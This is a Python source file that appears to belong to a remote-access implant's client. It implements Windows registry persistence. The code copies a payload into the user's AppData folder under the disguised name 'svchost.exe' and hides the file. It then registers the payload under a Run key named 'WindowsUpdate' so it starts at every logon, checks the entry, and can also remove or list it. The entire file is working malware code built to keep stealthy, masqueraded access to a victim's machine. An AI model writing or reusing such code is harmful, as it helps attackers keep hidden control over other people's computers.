import os
import subprocess

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class RegistryPersistence(PersistenceMethod):
    name = 'registry'

    def install(self, reg_name: str = 'WindowsUpdate', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            file_location = os.path.join(appdata, payload_name)

            _copy_payload(file_location)
            self._hide_file(file_location)

            result = subprocess.run(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v "{reg_name}" /t REG_SZ /d "{file_location}" /f',
                shell=True, capture_output=True, text=True, timeout=10,
            )

            if result.returncode != 0:
                return PersistenceResult(
                    False, 'registry',
                    f'[-] Registry add failed: {result.stderr.strip()}',
                    file_location
                )

            verified = self._verify_registry(reg_name, file_location)
            if not verified:
                return PersistenceResult(
                    False, 'registry',
                    '[-] Registry entry not found after install',
                    file_location
                )

            return PersistenceResult(
                True, 'registry',
                f'[+] Registry persistence installed: {reg_name} -> {payload_name}',
                file_location,
                'HKCU Run key, verified'
            )
        except Exception as e:
            return PersistenceResult(False, 'registry', f'[-] Registry error: {str(e)}')

    def remove(self, reg_name: str = 'WindowsUpdate', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            subprocess.run(
                f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{reg_name}" /f',
                shell=True, capture_output=True, timeout=10,
            )
            try:
                appdata = os.environ.get('appdata', os.path.expanduser('~'))
                os.remove(os.path.join(appdata, payload_name))
            except Exception:
                pass
            return PersistenceResult(True, 'registry', f'[+] Registry persistence removed: {reg_name}')
        except Exception as e:
            return PersistenceResult(False, 'registry', f'[-] Registry remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            result = subprocess.run(
                'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                shell=True, capture_output=True, text=True, timeout=10,
            )
            entries = [l.strip() for l in result.stdout.split('\n') if 'REG_SZ' in l]
            if entries:
                return PersistenceResult(True, 'registry', f'[+] Found {len(entries)} Run entries', details='\n'.join(entries))
            return PersistenceResult(True, 'registry', '[-] No Run registry entries found')
        except Exception:
            return PersistenceResult(False, 'registry', '[-] Registry check failed')

    def _hide_file(self, path: str):
        try:
            subprocess.run(f'attrib +h "{path}"', shell=True, capture_output=True)
        except Exception:
            pass

    def _verify_registry(self, reg_name: str, expected_path: str) -> bool:
        try:
            result = subprocess.run(
                f'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{reg_name}"',
                shell=True, capture_output=True, text=True, timeout=5,
            )
            return reg_name.lower() in result.stdout.lower() and expected_path.lower() in result.stdout.lower()
        except Exception:
            return False
